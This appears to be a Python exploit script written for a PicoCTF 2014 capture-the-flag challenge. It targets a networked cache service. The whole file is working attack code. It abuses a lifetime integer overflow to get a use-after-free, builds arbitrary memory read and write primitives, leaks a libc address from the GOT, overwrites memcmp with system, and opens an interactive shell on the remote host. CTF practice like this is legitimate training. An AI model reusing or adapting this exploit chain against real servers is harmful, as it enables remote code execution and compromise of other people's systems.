#!/usr/bin/python
import struct
import socket
import telnetlib

def pack4(v):
    """
    Takes a 32 bit integer and returns a 4 byte string representing the
    number in little endian. Modified to support negative integers.
    """
    v = v if v >= 0 else 2**32 + v # get two's complement representation of negative integers
    assert 0 <= v <= 0xffffffff
    # The < is for little endian, the I is for a 4 byte unsigned int.
    # See https://docs.python.org/2/library/struct.html for more info.
    return struct.pack('<I', v)

def unpack4(v):
    """Does the opposite of pack4."""
    assert len(v) == 4
    return struct.unpack('<I', v)[0]

CACHE_GET = 0
CACHE_SET = 1

kNotFound = 0x0
kFound = 0x1
kCacheFull = 0x2

def write_string(f, s):
    f.write(pack4(len(s)))
    f.write(s)

def read_string(f):
    size = unpack4(f.read(4))
    return f.read(size)

def cache_get(f, key):
    f.write(chr(CACHE_GET))
    write_string(f, key)

    status = ord(f.read(1))
    if status == kNotFound:
        return None
    assert status == kFound

    return read_string(f)

def cache_set(f, key, value, lifetime, pwn = False):
    '''
    When we call cache_set with the trigger element, we pass a value of True to
    the pwn argument to indicate that we won't treat the reply as a regular cache_set reply
    because we have called /bin/sh. This means we can now use the interact method of telnetlib.Terminal
    to send commands to the shell we spawned.
    '''
    f.write(chr(CACHE_SET))
    write_string(f, key)
    if (pwn):
        return 'W00t'
    status = ord(f.read(1))
    if status == kCacheFull:
        return False
    assert status == kFound

    write_string(f, value)
    f.write(pack4(lifetime))
    return True

'''
Literally free once :-)
Used as the lifetime of the vulnerable cache element
Once we call cache_get on the vulnerable element, its lifetime
will drop to -2147483648 (0x80000000).
If we call cache_get on the vulnerable element again, guess what?
Its lifetime becomes +2147483647 :) (0x7fffffff)
This way the cache won't mess with our pointers
the second time.
'''
FREE_ONCE_LIFETIME = -2147483647

class CacheSploit:
    shell_cmd = "/bin/sh\x00"
    memcmp_offset = 0x1428b0
    system_offset = 0x40190 #addresses have changed, download the libc.so.6 included here instead of the one provided by PicoCTF
    got_memcmp = 0x804b014
    hint_addr = 0x8048bc8

    COLOR_BLUE = '\033[94m'
    COLOR_GREEN = '\033[92m'
    COLOR_END = '\033[0m'

    trigger_elem_key = shell_cmd
    
    def __init__(self, sock, debug = False):
        self.sock = sock
        self.debug = debug
        self.setup_sock_fd(sock)
        self.init_trigger()
        self.init_primitive_vars()
        self.init_primitive_elems()
    
    def debug_print(self, to_print):
        if self.debug:
            print self.COLOR_BLUE + '[+] DEBUG: ' + str(to_print) + self.COLOR_END

    def init_trigger(self):
        self.debug_print('Creating shell trigger element with key %s' % (self.trigger_elem_key)) 
        cache_set(self.f, self.trigger_elem_key, self.shell_cmd, 10)

    def trigger(self):
        cache_set(self.f, self.trigger_elem_key, self.shell_cmd, 10, True)
    
    def setup_sock_fd(self, sock):
        self.f = sock.makefile('rw', bufsize=0)
    
    def init_primitive_vars(self):
        self.debug_print('Initializing keys/values for the read/write primitive elements')
        self.p_key = 'vuln_elem_key' * 40
        self.p_value = 'vuln_elem_value' * 40
        self.rw_key = 'A' * 256
        self.rw_value = struct.pack('<3I', 0x1fff, 0xffffffff, self.hint_addr)
    
    def init_primitive_elems(self):
        self.debug_print('Creating cache elements to be used for read/write access')
        tmp_key, tmp_value = 'vuln_elem_key2'*40, 'vuln_elem_value2'*40
        cache_set(self.f, self.p_key, self.p_value, FREE_ONCE_LIFETIME)
        cache_set(self.f, tmp_key, tmp_value, FREE_ONCE_LIFETIME)
        cache_get(self.f, self.p_key)
        cache_get(self.f, tmp_key)
        cache_set(self.f, self.rw_key, self.rw_value, 100000)
        cache_set(self.f, self.p_key, '', 100000)
        cache_get(self.f, self.p_key)
        cache_set(self.f, self.rw_key, self.rw_value, 100000)
    
    def set_addr(self, addr, buf_sz):
        self.rw_value = struct.pack('<3I', buf_sz, 0xffffffff, addr)
        assert cache_set(self.f, self.rw_key, self.rw_value, 100000)
    
    def read(self, addr, size):
        self.set_addr(addr, size)
        r = cache_get(self.f, self.p_key)
        self.debug_print('Read %r from address %s' % (r, hex(addr)))
        return r
    
    def write(self, addr, data):
        self.set_addr(addr, len(data))
        self.debug_print('[+] Writing %s (%i) to %s' % (data,len(data),hex(addr)))
        assert cache_set(self.f, self.p_key, data, 100000)

    def get_system_addr(self):
        addr = self.read(self.got_memcmp, 4)
        i_addr, = struct.unpack('<I', addr)
        self.debug_print('Leaked memcmp GOT address: %s' % (hex(i_addr)))
        sys_addr = i_addr - self.memcmp_offset + self.system_offset
        self.debug_print('Calculated system address: %s' % (hex(sys_addr)))
        return sys_addr

    def get_shell(self):
        sys_addr = self.get_system_addr()
        packed_sys_addr = struct.pack('<I', sys_addr)
        self.write(self.got_memcmp, packed_sys_addr)
        self.debug_print('Triggering the exploit')
        self.trigger()
        print self.COLOR_GREEN + '[+] w00t! Terminal is waiting for your input...' + self.COLOR_END
        t = telnetlib.Telnet()
        t.sock = self.sock
        t.interact()
        
        
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('vuln2014.picoctf.com', 4548))

sploit = CacheSploit(s, True)
sploit.get_shell()
